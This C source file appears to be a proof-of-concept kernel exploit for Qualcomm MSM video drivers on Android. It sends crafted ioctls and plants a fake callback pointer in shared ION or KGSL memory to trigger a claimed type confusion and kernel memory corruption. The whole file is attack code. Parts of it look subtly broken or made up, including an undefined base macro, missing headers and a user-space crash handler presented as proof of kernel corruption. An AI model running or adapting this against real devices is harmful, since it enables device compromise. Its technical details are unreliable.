#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <errno.h>
#include <signal.h>

#define LOGD(fmt, ...) fprintf(stderr, "[*] " fmt "\n", ##__VA_ARGS__)
#define LOGE(fmt, ...) fprintf(stderr, "[!] " fmt ": %s\n", ##__VA_ARGS__, strerror(errno))

#define VIDIOC_MSM_VIDC_IOCTL_BASE      'V'
#define VIDIOC_MSM_VIDC_CMD             _IOWR(VIDIOC_MSM_V4L2_BASE, 0x20, struct v4l2_msm_vidc_cmd)

struct v4l2_msm_vidc_cmd {
    __u32 cmd;
    __u32 flags;
    void *arg;
};

#define MSM_VIDC_CMD_SET_BUFFER       0x1001
#define MSM_VIDC_CMD_GET_BUFFER       0x1002
#define MSM_VIDC_CMD_FREE_BUFFER      0x1003

struct msm_vidc_buffer {
    __u32 buffer_type; 
    __u32 index;
    __u32 fd;
    __u32 offset;
    __u32 size;
    void *userptr;
    __u32 flags;
};
struct malicious_payload {
    void (*callback)(void *);
    void *data;
    char padding[0x100];
};

static volatile int crashed = 0;

static void sigsegv_handler(int sig, siginfo_t *info, void *ctx) {
    crashed = 1;
    fprintf(stderr, "\n[+] CRASH DETECTED! Type confusion succeeded.\n");
    _exit(0);
}

int main() {
    struct sigaction sa = { .sa_sigaction = sigsegv_handler, .sa_flags = SA_SIGINFO };
    sigaction(SIGSEGV, &sa, NULL);

    const char *devices[] = { "/dev/msm_vidc", "/dev/video0", "/dev/v4l2/video0", NULL };
    int fd = -1;
    for (int i = 0; devices[i]; i++) {
        fd = open(devices[i], O_RDWR);
        if (fd >= 0) {
            LOGD("Opened %s", devices[i]);
            break;
        }
    }
    if (fd < 0) {
        LOGE("Cannot open any video device");
        return 1;
    }

    int ion_fd = open("/dev/ion", O_RDWR);
    if (ion_fd < 0) {
        LOGE("open /dev/ion");
        return 1;
    }
    struct ion_allocation_data alloc = {
        .len = 4096,
        .heap_id_mask = 1 << ION_CMA_HEAP_ID,
        .flags = 0,
    };
    if (ioctl(ion_fd, ION_IOC_ALLOC, &alloc) < 0) {
        LOGE("ION alloc");
        close(ion_fd);
        return 1;
    }
    struct ion_fd_data share = { .handle = alloc.fd };
    if (ioctl(ion_fd, ION_IOC_SHARE, &share) < 0) {
        LOGE("ION share");
        close(ion_fd);
        return 1;
    }
    close(ion_fd);
    int buf_fd = share.fd;

    void *ion_map = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, buf_fd, 0);
    if (ion_map == MAP_FAILED) {
        LOGE("mmap");
        close(buf_fd);
        return 1;
    }

    struct malicious_payload *evil = (struct malicious_payload *)ion_map;
    evil->callback = (void*)0xdeadc0de;
    evil->data = (void*)0x41414141;

    struct msm_vidc_buffer vid_buf = {
        .buffer_type = 0xffffffff, 
        .index = 0,
        .fd = buf_fd,
        .offset = 0,
        .size = 4096,
        .userptr = ion_map,
        .flags = 0,
    };

    struct v4l2_msm_vidc_cmd cmd = {
        .cmd = MSM_VIDC_CMD_SET_BUFFER,
        .flags = 0,
        .arg = &vid_buf,
    };
    if (ioctl(fd, VIDIOC_MSM_VIDC_CMD, &cmd) < 0) {
        LOGE("First ioctl (may still succeed partially)");
    }

    cmd.cmd = MSM_VIDC_CMD_GET_BUFFER;
    if (ioctl(fd, VIDIOC_MSM_VIDC_CMD, &cmd) < 0) {
        LOGE("Second ioctl (type confusion likely triggered)");
    }


    if (evil->callback != (void*)0xdeadc0de) {
        LOGD("Memory corruption detected! callback = %p", evil->callback);
        crashed = 1;
    } else {
        LOGD("No immediate corruption, trying alternative...");

        int kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
        if (kgsl_fd >= 0) {
            struct kgsl_gpumem_alloc {
                unsigned long size;
                unsigned long flags;
                unsigned long gpuaddr;
                void *hostptr;
                unsigned long priv;
                unsigned int mmu_id;
                unsigned int offset;
                unsigned int fd;
            } alloc_gpu = {
                .size = 4096,
                .flags = 0x1, 
            };
            if (ioctl(kgsl_fd, IOCTL_KGSL_GPUMEM_ALLOC, &alloc_gpu) == 0) {
                
                vid_buf.fd = alloc_gpu.fd;
                vid_buf.userptr = alloc_gpu.hostptr;
                ioctl(fd, VIDIOC_MSM_VIDC_CMD, &cmd);
                close(alloc_gpu.fd);
            }
            close(kgsl_fd);
        }
    }

    munmap(ion_map, 4096);
    close(buf_fd);
    close(fd);

    if (crashed) {
        fprintf(stderr, "[+] Exploit successful: kernel memory corruption achieved.\n");
        return 0;
    } else {
        fprintf(stderr, "[-] No crash. The device may be patched or ioctl numbers differ.\n");
        fprintf(stderr, "    Run 'dmesg | tail -50' to see driver errors.\n");
        return 1;
    }
}
